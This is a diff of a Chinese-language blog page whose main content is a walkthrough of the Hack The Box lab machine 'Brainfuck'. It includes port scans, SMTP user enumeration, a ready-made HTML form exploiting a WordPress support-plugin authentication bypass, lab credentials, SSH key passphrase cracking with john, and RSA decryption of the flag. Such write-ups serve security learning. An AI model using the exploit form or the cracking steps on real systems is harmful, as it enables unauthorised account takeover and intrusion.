@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -254,11 +269,11 @@
 <p>以下是扫描结果：</p>
 <figure class="highlight nix"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nix">Discovered open port <span class="hljs-number">25</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.10</span>.<span class="hljs-number">10.17</span>                                     <br>Discovered open port <span class="hljs-number">443</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.10</span>.<span class="hljs-number">10.17</span>                                    <br>Discovered open port <span class="hljs-number">22</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.10</span>.<span class="hljs-number">10.17</span>                                     <br>Discovered open port <span class="hljs-number">143</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.10</span>.<span class="hljs-number">10.17</span>                                    <br>Discovered open port <span class="hljs-number">110</span><span class="hljs-symbol">/tcp</span> on <span class="hljs-number">10.10</span>.<span class="hljs-number">10.17</span>      <br><br>PORT    STATE SERVICE  VERSION<br><br><span class="hljs-number">22</span><span class="hljs-symbol">/tcp</span>  open  ssh      OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">1</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br><br><span class="hljs-number">25</span><span class="hljs-symbol">/tcp</span>  open  smtp     Postfix smtpd<br>|<span class="hljs-params">_smtp-commands:</span> brainfuck, PIPELINING, SIZE <span class="hljs-number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="hljs-number">8</span>BITMIME, DSN, <br><br><span class="hljs-number">110</span><span class="hljs-symbol">/tcp</span> open  pop3     Dovecot pop3d<br><br>|<span class="hljs-params">_pop3-capabilities:</span> TOP UIDL CAPA RESP-CODES SASL(PLAIN) USER PIPELINING AUTH-RESP-CODE<br><br><span class="hljs-number">143</span><span class="hljs-symbol">/tcp</span> open  imap     Dovecot imapd<br><br>|<span class="hljs-params">_imap-capabilities:</span> IDLE IMAP4rev1 LITERAL<span class="hljs-operator">+</span> more listed have capabilities LOGIN-REFERRALS ENABLE ID OK post-login Pre-login SASL-IR AUTH<span class="hljs-operator">=</span>PLAINA0001<br><br><span class="hljs-number">443</span><span class="hljs-symbol">/tcp</span> open  ssl<span class="hljs-symbol">/http</span> nginx <span class="hljs-number">1.10</span>.<span class="hljs-number">0</span> (Ubuntu)<br>|<span class="hljs-params">_http-server-header:</span> nginx<span class="hljs-symbol">/1.10.0</span> (Ubuntu)<br><br>| <span class="hljs-params">ssl-cert:</span> <span class="hljs-params">Subject:</span> commonName<span class="hljs-operator">=</span>brainfuck.htb<span class="hljs-operator">/</span>organizationName<span class="hljs-operator">=</span>Brainfuck Ltd.<span class="hljs-operator">/</span>stateOrProvinceName<span class="hljs-operator">=</span>Attica<span class="hljs-operator">/</span>countryName<span class="hljs-operator">=</span>GR<br><br>| Subject Alternative <span class="hljs-params">Name:</span> DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb<br>                             <br>Service <span class="hljs-params">Info:</span> <span class="hljs-params">Host:</span>  brainfuck; <span class="hljs-params">OS:</span> Linux; <span class="hljs-params">CPE:</span> cpe:<span class="hljs-operator">/</span>o:linux:linux_kernel<br></code></pre></div></td></tr></table></figure>
 <h2 id="smtp（简单邮件传输协议）枚举存在用户"><a href="#smtp（简单邮件传输协议）枚举存在用户" class="headerlink" title="smtp（简单邮件传输协议）枚举存在用户"></a><strong>smtp（简单邮件传输协议）枚举存在用户</strong></h2><p><code>smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.10.10.17</code></p>
-<p><img src="/1.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/1.PNG"></p>
 <h2 id="web分析"><a href="#web分析" class="headerlink" title="web分析"></a><strong>web分析</strong></h2><p>访问地址<code>https://10.10.10.17</code></p>
 <figure class="highlight axapta"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs axapta">Welcome to nginx!<br>If you see <span class="hljs-keyword">this</span> page, the nginx web <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> successfully installed and working<br></code></pre></div></td></tr></table></figure>
 <p>nmap、nikto，都显示了域名：commonName&#x3D;brainfuck.htb</p>
-<p><img src="/3.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/3.PNG"></p>
 <p>同样也可以用sslyze查询域名。</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sslyze --regular 10.10.10.17 &gt; /root/Desktop/10.10.10.17/domain<br><span class="hljs-built_in">cat</span> /root/Desktop/10.10.10.17/domain | grep <span class="hljs-string">&quot;Name&quot;</span><br></code></pre></div></td></tr></table></figure>
 
@@ -266,13 +281,13 @@
 <li>用burp，将host修改为brainfuck.htb，可以看到nginx 默认配置页面变成了另一个页面。<br>访问<a target="_blank" rel="noopener" href="https://brainfuck.htb/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0wordpress%E7%AB%99">https://brainfuck.htb/，可以看到wordpress站</a></li>
 </ul>
 <p>修改&#x2F;etc&#x2F;hosts<br><code>echo 10.10.10.17 brainfuck.htb sup3rs3cr3t.brainfuck.htb www.brainfuck.htb&gt;&gt; /etc/hosts</code></p>
-<h4 id="分析三个域名的网页"><a href="#分析三个域名的网页" class="headerlink" title="分析三个域名的网页"></a>分析三个域名的网页</h4><p><img src="/4.PNG" srcset="/img/loading.gif"></p>
+<h4 id="分析三个域名的网页"><a href="#分析三个域名的网页" class="headerlink" title="分析三个域名的网页"></a>分析三个域名的网页</h4><p><img src="/4.PNG"></p>
 <p>访问：<a target="_blank" rel="noopener" href="https://brainfuck.htb/%EF%BC%8Chttps://www.brainfuck.htb%EF%BC%8Chttps://sup3rs3cr3t.brainfuck.htb">https://brainfuck.htb/，https://www.brainfuck.htb，https://sup3rs3cr3t.brainfuck.htb</a></p>
 <h5 id="wordpress扫描器——wpscan"><a href="#wordpress扫描器——wpscan" class="headerlink" title="wordpress扫描器——wpscan"></a><strong>wordpress扫描器——wpscan</strong></h5><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wpscan</span> --url https://brainfuck.htb/ --disable-tls-checks<br><br><span class="hljs-attribute">WordPress</span> version <span class="hljs-number">4</span>.<span class="hljs-number">7</span>.<span class="hljs-number">3</span> <br><br><span class="hljs-attribute">WP</span> Support Plus Responsive Ticket System &lt;= <span class="hljs-number">8</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span> - Remote Code Execution (RCE)<br></code></pre></div></td></tr></table></figure>
-<p><img src="/5.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/5.PNG"></p>
 <p>该扫描器发现了4个插件漏洞。主要是“WP Support Plus Responsive Ticket System”</p>
 <h5 id="searchsploit"><a href="#searchsploit" class="headerlink" title="searchsploit"></a><strong>searchsploit</strong></h5><p>searchsploit WP Support Plus Responsive</p>
-<p><img src="/2.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2.PNG"></p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> -m exploits/php/webapps/<span class="hljs-number">34589</span>.txt<br><span class="hljs-attribute">searchsploit</span> -m exploits/php/webapps/<span class="hljs-number">41006</span>.txt<br><span class="hljs-attribute">searchsploit</span> -m exploits/php/webapps/<span class="hljs-number">40939</span>.txt<br></code></pre></div></td></tr></table></figure>
 <p>经过测试，找到了可用exp</p>
 <p>wordpress插件“WP Support Plus Responsive Ticket System 7.1.3”提权漏洞。<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41006">https://www.exploit-db.com/exploits/41006</a></p>
@@ -280,31 +295,31 @@
 <h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>将以下表单，保存为exp.html</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">&lt;form <span class="hljs-keyword">method</span>=&quot;post&quot; action=&quot;https://brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt;<br><br>	Username: &lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;text&quot; <span class="hljs-type">name</span>=&quot;username&quot; <span class="hljs-keyword">value</span>=&quot;admin&quot;&gt;<br><br>	&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;email&quot; <span class="hljs-keyword">value</span>=&quot;sth&quot;&gt;<br><br>	&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;hidden&quot; <span class="hljs-type">name</span>=&quot;action&quot; <span class="hljs-keyword">value</span>=&quot;loginGuestFacebook&quot;&gt;<br><br>	&lt;<span class="hljs-keyword">input</span> <span class="hljs-keyword">type</span>=&quot;submit&quot; <span class="hljs-keyword">value</span>=&quot;Login&quot;&gt;<br><br>&lt;/form&gt;<br></code></pre></div></td></tr></table></figure>
 <p>用python开启本地服务器</p>
-<p><img src="/6.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/6.PNG"></p>
 <p>点击exp.html，跳转到一个表单，点击Login</p>
 <p>稍等一会儿，然后访问wordpress的管理页面<code>https://brainfuck.htb/wp-admin</code>，发现我们进行漏洞利用成功了。</p>
 <h2 id="获得web后台权限"><a href="#获得web后台权限" class="headerlink" title="获得web后台权限"></a><strong>获得web后台权限</strong></h2><p>登陆wordpress表单后，网站后台获得一个口令。<br> <code>orestis</code> | <code>kHGuERB29DNiNE</code></p>
-<p><img src="/8.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/8.PNG"></p>
 <p>获得了一个口令，然后我们用这个口令登入143端口，这是IMAP服务。Internet Message Access Protocol（互联网邮件访问协议）</p>
-<p>简便起见，我们使用图形化界面的邮件客户端。<br><img src="/9.PNG" srcset="/img/loading.gif"></p>
-<h4 id="配置IMAP客户端"><a href="#配置IMAP客户端" class="headerlink" title="配置IMAP客户端"></a>配置IMAP客户端</h4><p><img src="/10.PNG" srcset="/img/loading.gif"></p>
-<p><img src="/12.PNG" srcset="/img/loading.gif"></p>
-<p><img src="/13.PNG" srcset="/img/loading.gif"></p>
-<p><img src="/14.PNG" srcset="/img/loading.gif"></p>
+<p>简便起见，我们使用图形化界面的邮件客户端。<br><img src="/9.PNG"></p>
+<h4 id="配置IMAP客户端"><a href="#配置IMAP客户端" class="headerlink" title="配置IMAP客户端"></a>配置IMAP客户端</h4><p><img src="/10.PNG"></p>
+<p><img src="/12.PNG"></p>
+<p><img src="/13.PNG"></p>
+<p><img src="/14.PNG"></p>
 <figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span> orestis<br><span class="hljs-symbol">password:</span> kIEnnfEKJ<span class="hljs-meta">#9UmdO</span><br></code></pre></div></td></tr></table></figure>
-<p>得到了一个论坛的口令，在论坛<code>https://sup3rs3cr3t.brainfuck.htb/</code>以该口令登陆，然后看到了一些编码后的信息。<br><img src="/15.PNG" srcset="/img/loading.gif"></p>
+<p>得到了一个论坛的口令，在论坛<code>https://sup3rs3cr3t.brainfuck.htb/</code>以该口令登陆，然后看到了一些编码后的信息。<br><img src="/15.PNG"></p>
 <p>搜索Vigenere加密（维吉尼亚密码），在在线网站<a target="_blank" rel="noopener" href="http://www.dcode.fr/vigenere-cipher%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">http://www.dcode.fr/vigenere-cipher进行解密</a></p>
 <h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>在一个<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%87%B1%E6%92%92%E5%AF%86%E7%A2%BC" title="凯撒密码">凯撒密码</a>中，字母表中的每一字母都会作一定的偏移，例如偏移量为3时，A就转换为了D、B转换为了E……而维吉尼亚密码则是由一些偏移量不同的恺撒密码组成。</p>
 <p>为了生成密码，需要使用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%A1%A8%E6%A0%BC%E6%B3%95" title="表格法">表格法</a>。这一表格包括了26行字母表，每一行都由前一行向左偏移一位得到。具体使用哪一行字母表进行编译是基于密钥进行的，在过程中会不断地变换。</p>
 <p>破译维吉尼亚密码的关键在于它的密钥是循环重复的。如果我们知道了密钥的长度，那密文就可以被看作是交织在一起的凯撒密码，而其中每一个都可以单独破解。使用卡西斯基试验和弗里德曼试验来得到密钥的长度。</p>
-<p><img src="/16.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/16.PNG"></p>
 <p>将图中的字符串解密，得到了一个http地址，下载文件后，发现是ssh密钥。<br><code>https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</code></p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> <span class="hljs-number">400</span> id_rsa<br><span class="hljs-attribute">ssh</span> -i id_rsa orestis@<span class="hljs-number">10.10.10.17</span><br></code></pre></div></td></tr></table></figure>
 <p>尝试连接，发现需要密码。于是我们用john爆破密码。</p>
 <p><a target="_blank" rel="noopener" href="http://grayhat.shoutwiki.com/wiki/SSH_tricks">http://grayhat.shoutwiki.com/wiki/SSH_tricks</a>，这篇blog提到的方法，可以破解id_rsa的密钥。</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">wget https://raw.githubusercontent.com/stricture/hashstack-<span class="hljs-keyword">server</span>-plugin-jtr/master/scrapers/sshng2john.py<br><br>python sshng2john.py id_rsa &gt; id_rsa.<span class="hljs-keyword">encrypted</span><br><br>john id_rsa.<span class="hljs-keyword">encrypted</span> <span class="hljs-comment">--wordlist=/usr/share/wordlists/rockyou.txt</span><br></code></pre></div></td></tr></table></figure>
-<p><img src="/17.PNG" srcset="/img/loading.gif"></p>
-<h2 id="获得user权限"><a href="#获得user权限" class="headerlink" title="获得user权限"></a><strong>获得user权限</strong></h2><p>接下来准备提取root权限，我们看到目录下，有一个c代码，将<code>/root/root.txt</code>（这个是我们想要获取的flag）进行编码，生成了debug.txt<br><img src="/18.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/17.PNG"></p>
+<h2 id="获得user权限"><a href="#获得user权限" class="headerlink" title="获得user权限"></a><strong>获得user权限</strong></h2><p>接下来准备提取root权限，我们看到目录下，有一个c代码，将<code>/root/root.txt</code>（这个是我们想要获取的flag）进行编码，生成了debug.txt<br><img src="/18.PNG"></p>
 <p>在这里，我们需要知道一点RSA算法。 <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/RSA">https://zh.wikipedia.org/wiki/RSA</a></p>
 <p>跟我复习一下RSA算法的原理。<br>P、Q是随意选择的两个质数（越大越安全）<br>e是随意选择的一个整数，e与m（m与p和q相关）互为质数。<br>n是pq的乘积。</p>
 <p>公布的数是n和e，其他的数字作为私钥不公布。<br>注意，这里总共提到了四个数PQNE，PQ是随意选择的质数，</p>
@@ -313,7 +328,7 @@
 <p>而在代码中，将pqe这三个数写入了debug.txt</p>
 <figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">debug.write</span>(<span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-variable">p</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)</span><br><span class="hljs-variable">debug.write</span>(<span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-variable">q</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)</span><br><span class="hljs-variable">debug.write</span>(<span class="hljs-function"><span class="hljs-title">str</span>(<span class="hljs-variable">e</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)</span><br></code></pre></div></td></tr></table></figure>
 <p>于是我们来查看一下debug.txt</p>
-<p><img src="/19.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/19.PNG"></p>
 <p>写一段<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Whale3070/ctf-coding/master/rsa.py">python代码</a>，将output.txt “Encrypted Password:”这一段密码解密，通过参数pqe（debug.txt给出）以及rsa算法解密，即可得到flag。</p>
 
             </div>
@@ -451,10 +466,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
